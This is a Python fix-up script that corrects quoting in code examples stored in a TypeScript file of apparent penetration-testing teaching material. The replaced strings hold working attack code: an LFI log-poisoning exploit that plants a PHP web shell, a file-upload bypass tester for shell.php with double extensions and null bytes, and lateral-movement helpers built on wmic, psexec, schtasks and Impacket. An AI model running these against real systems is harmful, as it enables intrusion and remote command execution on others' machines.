import os

file_path = os.path.join(os.path.dirname(__file__), '../src/data/cyberPenetration.ts')

with open(file_path, 'r', encoding='utf-8') as f:
    content = f.read()

# 修复第976行的chr(0)问题
content = content.replace(
    '("shell.php" + chr(0) + ".jpg", "image/jpeg")',
    '("shell.php\\x00.jpg", "image/jpeg")'
)

# 修复第838行的代码示例引号问题
old_code_838 = '''code: 'import requests\nimport sys\n\ndef exploit_lfi(target, session_cookie):\n    # 1. 写入恶意代码到日志\n    headers = {\n        "User-Agent": "<?php system($_GET['cmd']); ?>"\n    }\n    cookies = {"PHPSESSID": session_cookie}\n    \n    print("[+] 发送恶意请求写入日志...")\n    requests.get(target, headers=headers, cookies=cookies)\n    \n    # 2. LFI包含日志文件\n    log_paths = [\n        "/var/log/apache2/access.log",\n        "/var/log/httpd/access_log",\n        "/var/log/nginx/access.log"\n    ]\n    \n    for log_path in log_paths:\n        print(f"[+] 尝试包含: {log_path}")\n        url = f"{target}?page=php://filter/convert.base64-encode/resource={log_path}"\n        try:\n            r = requests.get(url, cookies=cookies)\n            if "<?php" in r.text or "apache" in r.text.lower():\n                print("[+] 找到日志文件!")\n                return log_path\n        except:\n            pass\n    \n    return None\n\n# 使用示例\n# python lfi_exploit.py http://target.com/index.php?sess=abc123'''

new_code_838 = '''code: `import requests\nimport sys\n\ndef exploit_lfi(target, session_cookie):\n    # 1. 写入恶意代码到日志\n    headers = {\n        "User-Agent": "<?php system($_GET['cmd']); ?>"\n    }\n    cookies = {"PHPSESSID": session_cookie}\n    \n    print("[+] 发送恶意请求写入日志...")\n    requests.get(target, headers=headers, cookies=cookies)\n    \n    # 2. LFI包含日志文件\n    log_paths = [\n        "/var/log/apache2/access.log",\n        "/var/log/httpd/access_log",\n        "/var/log/nginx/access.log"\n    ]\n    \n    for log_path in log_paths:\n        print(f"[+] 尝试包含: {log_path}")\n        url = f"{target}?page=php://filter/convert.base64-encode/resource={log_path}"\n        try:\n            r = requests.get(url, cookies=cookies)\n            if "<?php" in r.text or "apache" in r.text.lower():\n                print("[+] 找到日志文件!")\n                return log_path\n        except:\n            pass\n    \n    return None\n\n# 使用示例\n# python lfi_exploit.py http://target.com/index.php?sess=abc123`'''

content = content.replace(old_code_838, new_code_838)

# 修复第975-976行的代码示例引号问题
old_code_975 = '''code: 'import requests\nimport sys\n\ndef test_upload(target_url, file_path):\n    # 读取要上传的文件\n    with open(file_path, "rb") as f:\n        file_data = f.read()\n    \n    # 测试各种绕过\n    bypasses = [\n        # 原始文件\n        ("shell.php", "application/octet-stream"),\n        # MIME绕过\n        ("shell.php", "image/jpeg"),\n        ("shell.php", "image/png"),\n        # 扩展名绕过\n        ("shell.php3", "application/octet-stream"),\n        ("shell.php5", "application/octet-stream"),\n        ("shell.phtml", "application/octet-stream"),\n        # 双重扩展名\n        ("shell.jpg.php", "image/jpeg"),\n        ("shell.php.jpg", "image/jpeg"),\n        # 空字节 - 使用chr(0)构造\n        ("shell.php\\\\x00.jpg", "image/jpeg"),\n    ]\n    \n    for filename, content_type in bypasses:\n        files = {"file": (filename, file_data, content_type)}\n        try:\n            r = requests.post(target_url, files=files, timeout=5)\n            print(f"[+] 测试: {filename} ({content_type})")\n            # 检查是否上传成功\n            if "success" in r.text.lower() or r.status_code == 200:\n                print(f"[+] 可能成功! 检查上传目录")\n        except Exception as e:\n            print(f"[-] 错误: {e}")\n\n# Usage\n# python upload_test.py http://target.com/upload.php shell.php'''

new_code_975 = '''code: `import requests\nimport sys\n\ndef test_upload(target_url, file_path):\n    # 读取要上传的文件\n    with open(file_path, "rb") as f:\n        file_data = f.read()\n    \n    # 测试各种绕过\n    bypasses = [\n        # 原始文件\n        ("shell.php", "application/octet-stream"),\n        # MIME绕过\n        ("shell.php", "image/jpeg"),\n        ("shell.php", "image/png"),\n        # 扩展名绕过\n        ("shell.php3", "application/octet-stream"),\n        ("shell.php5", "application/octet-stream"),\n        ("shell.phtml", "application/octet-stream"),\n        # 双重扩展名\n        ("shell.jpg.php", "image/jpeg"),\n        ("shell.php.jpg", "image/jpeg"),\n        # 空字节\n        ("shell.php\\x00.jpg", "image/jpeg"),\n    ]\n    \n    for filename, content_type in bypasses:\n        files = {"file": (filename, file_data, content_type)}\n        try:\n            r = requests.post(target_url, files=files, timeout=5)\n            print(f"[+] 测试: {filename} ({content_type})")\n            # 检查是否上传成功\n            if "success" in r.text.lower() or r.status_code == 200:\n                print(f"[+] 可能成功! 检查上传目录")\n        except Exception as e:\n            print(f"[-] 错误: {e}")\n\n# Usage\n# python upload_test.py http://target.com/upload.php shell.php`'''

content = content.replace(old_code_975, new_code_975)

# 修复第2129行的代码示例引号问题
old_code_2129 = '''code: 'import subprocess\n\ndef wmi lateral(target, command):\n    """WMI远程执行"""
    cmd = f'wmic /node:{target} process call create "{command}"'
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout\n\ndef psexec_lateral(target, payload, user="", password=""):\n    """PsExec远程执行"""
    if user and password:
        cmd = f'psexec.exe \\\\\\{target} -u {user} -p {password} {payload}'
    else:
        cmd = f'psexec.exe \\\\\\{target} {payload}'
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout\n\ndef schtasks_lateral(target, taskname, command):\n    """计划任务横向"""
    # 创建任务
    create_cmd = f'schtasks /create /s {target} /tn {taskname} /tr "{command}" /sc once /st 00:00 /f'
    subprocess.run(create_cmd, shell=True)
    # 运行任务
    run_cmd = f'schtasks /run /s {target} /tn {taskname}'
    result = subprocess.run(run_cmd, shell=True, capture_output=True, text=True)
    return result.stdout\n\n# Impacket示例\n# wmiexec.py domain/user@target "whoami"\n# psexec.py domain/user@target "cmd.exe"\n# smbexec.py domain/user@target'''

new_code_2129 = '''code: `import subprocess\n\ndef wmi_lateral(target, command):\n    """WMI远程执行"""
    cmd = f"wmic /node:{target} process call create \\"{command}\\""
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout\n\ndef psexec_lateral(target, payload, user="", password=""):\n    """PsExec远程执行"""
    if user and password:
        cmd = f"psexec.exe \\\\\\{target} -u {user} -p {password} {payload}"
    else:
        cmd = f"psexec.exe \\\\\\{target} {payload}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout\n\ndef schtasks_lateral(target, taskname, command):\n    """计划任务横向"""
    # 创建任务
    create_cmd = f"schtasks /create /s {target} /tn {taskname} /tr \\"{command}\\" /sc once /st 00:00 /f"
    subprocess.run(create_cmd, shell=True)
    # 运行任务
    run_cmd = f"schtasks /run /s {target} /tn {taskname}"
    result = subprocess.run(run_cmd, shell=True, capture_output=True, text=True)
    return result.stdout\n\n# Impacket示例\n# wmiexec.py domain/user@target "whoami"\n# psexec.py domain/user@target "cmd.exe"\n# smbexec.py domain/user@target`'''

content = content.replace(old_code_2129, new_code_2129)

with open(file_path, 'w', encoding='utf-8') as f:
    f.write(content)

print('修复完成!')